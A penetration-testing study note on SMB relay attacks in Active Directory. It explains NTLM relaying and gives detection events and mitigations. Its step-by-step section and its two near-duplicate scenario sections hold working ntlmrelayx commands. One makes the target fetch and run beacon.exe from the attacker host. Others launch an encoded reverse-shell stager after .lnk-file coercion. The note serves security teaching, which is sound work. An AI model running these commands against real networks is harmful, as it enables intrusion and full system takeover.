---
tags: [activedirectory, smb, smbrelay, ntlm, lateralmovement]
difficulty: advanced
module: "36 - Active Directory Attacks"
topic: "36.12 SMB Relay"
---

# 36.12 SMB Relay Attack

## 1. Executive Summary

The SMB Relay attack is a highly specific, historically notorious, and highly effective subset of the broader NTLM Relay vulnerability family. It focuses entirely on intercepting Server Message Block (SMB) authentication traffic and relaying it to another SMB service on a target machine. By successfully relaying SMB authentication of a privileged user (such as a local administrator or domain admin), an attacker can achieve Remote Code Execution (RCE), dump the Security Account Manager (SAM) database, or deploy malware across the network, completely bypassing the need to crack passwords or hashes.

## 2. Theoretical Background and Core Concepts

### Server Message Block (SMB)
SMB is the primary protocol used in Windows environments for file sharing, printer sharing, and remote administration (via Named Pipes like DCE/RPC). When a Windows machine attempts to access an SMB share (e.g., `\\SERVER\Share`), it automatically attempts to authenticate using the current user's credentials via NTLM over SMB.

### The Mechanics of SMB Relaying
In an SMB-to-SMB relay attack, the attacker positions a listener on port 445 (SMB) on their own machine. They then trick a victim machine into attempting to access an SMB share on the attacker's machine. 
Because NTLM is a challenge-response protocol without inherent session binding (unless SMB signing is enforced), the attacker can forward the incoming NTLM negotiation (Type 1) to a target server, retrieve the target's Challenge (Type 2), send it back to the victim, and finally forward the victim's valid Response (Type 3) to the target. The target server validates the response and grants the attacker an administrative SMB session.

## 3. The Mechanics of the Attack

The standard operational flow for an SMB Relay attack:
1. **Target Identification**: The attacker scans the network to identify hosts that have SMB Signing explicitly Disabled or "Enabled but not Required". These are vulnerable targets.
2. **Listener Configuration**: The attacker configures a tool like `ntlmrelayx.py` or `smbrelayx.py` to listen on TCP 445 and specifies the vulnerable targets.
3. **Traffic Interception / Coercion**: The attacker forces a victim to authenticate to them. Methods include:
   - LLMNR/NBT-NS Poisoning (using Responder).
   - Placing malicious `.lnk` files on public file shares.
   - Sending phishing emails with `file://` URIs.
4. **Relay & Execution**: The victim connects, the attacker relays the auth to the vulnerable target. Upon successful authentication, the attacker uses the established SMB session to write a binary, create a service via DCE/RPC (Service Control Manager), and execute code as `NT AUTHORITY\SYSTEM`.

## 4. ASCII Architecture Diagram

```text
+-------------------------------------------------------------------------+
|                              SMB Relay Flow                             |
+-------------------------------------------------------------------------+

  [ Victim Desktop ]           [ Attacker Machine ]            [ Target File Server ]
  (User: IT_Admin)             (IP: 10.0.0.50)                 (IP: 10.0.0.100)
       |                               |                               |
       |  LLMNR Request: "PRINTSRV"    |                               |
       |------------------------------>|                               |
       |  Poisoned Reply: 10.0.0.50    |                               |
       |<------------------------------|                               |
       |                               |                               |
       |  SMB Connect (NTLM Type 1)    |                               |
       |------------------------------>|  SMB Connect (NTLM Type 1)    |
       |                               |------------------------------>|
       |                               |                               |
       |                               |  SMB Challenge (NTLM Type 2)  |
       |  SMB Challenge (NTLM Type 2)  |<------------------------------|
       |<------------------------------|                               |
       |                               |                               |
       |  SMB Response (NTLM Type 3)   |                               |
       |------------------------------>|  SMB Response (NTLM Type 3)   |
       |                               |------------------------------>|
       |                               |                               |
       |                               |  Authentication Success       |
       |                               |<=============================>|
       |                               |  Attacker uses Psexec over    |
                                          the relayed SMB session to   
                                          dump SAM or execute payload.
```

## 5. Prerequisites and Required Tools

**Prerequisites:**
- The Target Machine must **not** require SMB Signing. (By default, Windows Workstations do not require it, while Domain Controllers do).
- The Victim User being relayed must have Local Administrator privileges on the Target Machine to achieve code execution or SAM dumping.
- The attacker's port 445 must be available (if using a Linux VM, ensure the local Samba service is disabled).

**Tools:**
- **Responder**: To intercept traffic and poison name resolution.
- **ntlmrelayx.py** (from Impacket suite): The industry standard for relaying.
- **CrackMapExec / NetExec**: For rapidly scanning subnets to identify systems with SMB signing disabled (`--gen-relay-list`).

## 6. Step-by-Step Execution

### Step 1: Discover Vulnerable Targets
Use CrackMapExec to find systems where SMB Signing is false.
```bash
cme smb 192.168.1.0/24 --gen-relay-list targets.txt
```
This generates a `targets.txt` file containing only IPs where SMB Signing is NOT required.

### Step 2: Prepare Responder
Edit `/etc/responder/Responder.conf` and turn OFF the SMB and HTTP servers. This is critical so Responder doesn't consume the auth; it simply poisons the name resolution and lets `ntlmrelayx` handle the traffic.
```ini
[Responder Core]
SMB = Off
HTTP = Off
```

### Step 3: Launch NTLM Relay
Start `ntlmrelayx.py` targeting the list generated in Step 1.
To automatically dump the SAM database upon successful relay:
```bash
ntlmrelayx.py -tf targets.txt -smb2support
```
To execute a specific command:
```bash
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell.exe -c 'Invoke-WebRequest -Uri http://10.0.0.50/beacon.exe -OutFile C:\Windows\Temp\b.exe; C:\Windows\Temp\b.exe'"
```
To obtain an interactive SMB shell (socks proxy):
```bash
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

### Step 4: Launch Responder
Start Responder to begin poisoning traffic.
```bash
python3 Responder.py -I eth0 -dwv
```

Wait for a privileged user to trigger broadcast traffic. `ntlmrelayx` will catch the connection, relay it, and execute your payload.

## 7. Detection and Artifacts

1. **Event ID 4624 (Logon)**: Look for logon type 3 (Network) events where the user is an administrator, but the source IP is unusual (the attacker's machine).
2. **Event ID 4688 (Process Creation)**: If code execution is achieved (e.g., via Service Control Manager), look for unusual child processes spawning from `services.exe`, such as `cmd.exe` or `powershell.exe` executing encoded commands or creating reverse shells.
3. **Event ID 7045 (Service Creation)**: Attackers often use remote service creation (similar to psexec) to execute code over SMB. Look for random or suspicious service names (e.g., `BTOBTOBTO`) being created and started.
4. **Network Telemetry**: A single IP address (attacker) communicating via SMB to multiple distinct workstations in a short timeframe, passing authentication data belonging to a variety of users.

## 8. Mitigation and Prevention

1. **Enforce SMB Signing via GPO**: 
   - Path: `Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Local Policies -> Security Options`.
   - Setting: `Microsoft network server: Digitally sign communications (always)` -> **Enabled**.
   - Setting: `Microsoft network client: Digitally sign communications (always)` -> **Enabled**.
   *Note: Enforcing SMB signing can cause minor performance degradation on high-throughput file servers, but is essential for security.*
2. **Disable LLMNR, NBT-NS, and mDNS**: Prevent the initial poisoning phase. Use GPO to disable multicast name resolution.
3. **Tiered Access / Local Admin Restrictions**: Implement Microsoft LAPS to ensure local admin passwords are randomized. Ensure Domain Admins cannot log into standard workstations, preventing their credentials from being broadcast and relayed.
4. **Firewall Rules**: Implement endpoint firewalls to block inbound SMB (TCP 445) from workstation to workstation, only allowing it from dedicated jump hosts or file servers.

## Real-World Attack Scenario

During an internal security assessment, an attacker was positioned on a standard user VLAN and aimed to obtain Local Administrator rights on engineering workstations. A sweep of the environment indicated that the engineering workstations did not enforce SMB signing.

**The Context**
The environment allowed SMB traffic between user workstations, and the attacker sought to exploit a highly privileged engineering manager's authentication.

**The Execution**
1.  **Listener Setup:** The attacker started `ntlmrelayx.py` to target the engineering workstations, configuring it to execute a reverse shell stager instead of dumping hashes.
    `ntlmrelayx.py -tf smb_targets.txt -smb2support -c "powershell -nop -w hidden -enc JABzAD0ATg..."`
2.  **Traffic Coercion:** The attacker dropped a maliciously crafted `.lnk` file into an open, globally writable file share used by the engineering team. The `.lnk` file's icon path pointed back to the attacker's IP.
3.  **The Trigger:** An engineering manager browsed the shared folder via Windows Explorer, causing Windows to attempt to fetch the icon from the attacker's machine, triggering an SMB connection and NTLM negotiation.
4.  **The Relay and Outcome:** The manager's machine sent its NTLM authentication to `ntlmrelayx`. The tool successfully relayed this to a vulnerable workstation. Since the manager was part of the "Engineering Admins" group, `ntlmrelayx` utilized DCE/RPC to create a service on the target, executing the payload and providing the attacker with an `NT AUTHORITY\SYSTEM` reverse shell.

## 9. Chaining Opportunities

- **[[11 - NTLM Relay Attack]]**: SMB Relay is a protocol-specific implementation of the broader NTLM Relay methodology.
- **[[19 - Responder and Poisoning]]**: Responder is the primary enabler for this attack by coercing the victim to send the SMB authentication in the first place.
- **[[28 - PrinterBug (MS-RPRN)]]**: Using the PrinterBug to coerce a domain controller machine account to authenticate, which can then be relayed (though usually relayed to LDAP/HTTP rather than SMB due to DC signing requirements).

## 10. Related Notes

- [[01 - Active Directory Basics]]
- [[03 - NTLM Authentication Deep Dive]]
- [[15 - Lateral Movement Techniques]]

---
*Note: This material is for educational and authorized penetration testing purposes only.*

## Real-World Attack Scenario
## 11. Real-World Attack Scenario

During an assumed-breach assessment, an attacker was positioned on a standard user VLAN. The objective was to obtain Local Administrator rights on engineering workstations. A sweep of the environment using `cme smb 10.20.30.0/24 --gen-relay-list smb_targets.txt` indicated that none of the Windows 10 workstations enforced SMB signing.

**The Execution**
1.  **Listener Setup:** The attacker started `ntlmrelayx.py` to target the engineering workstations. Instead of dumping hashes, they configured it to execute a PowerShell reverse shell stager, aiming for a stable C2 connection:
    ```bash
    ntlmrelayx.py -tf smb_targets.txt -smb2support -c "powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBl..."
    ```
2.  **Traffic Coercion:** Recognizing that wait-and-see LLMNR poisoning might take too long, the attacker utilized a targeted coercion technique. They dropped a maliciously crafted `.lnk` file into an open, globally writable file share commonly used by the engineering team. The `.lnk` file's icon path pointed back to the attacker's IP: `\\10.20.10.99\icon.ico`.
3.  **The Trigger:** An engineering manager browsed the shared folder via Windows Explorer. Windows automatically attempted to fetch the icon from the attacker's machine, triggering an SMB connection and NTLM negotiation.
4.  **The Relay and Outcome:** The manager's machine sent its NTLM authentication to `ntlmrelayx`. The tool successfully relayed this authentication to `10.20.30.15` (a vulnerable workstation). Because the manager was a member of the "Engineering Admins" group, the authentication granted administrative access. `ntlmrelayx` immediately utilized DCE/RPC to create a service on the target, executing the PowerShell payload and providing the attacker with an `NT AUTHORITY\SYSTEM` reverse shell on the engineering workstation.

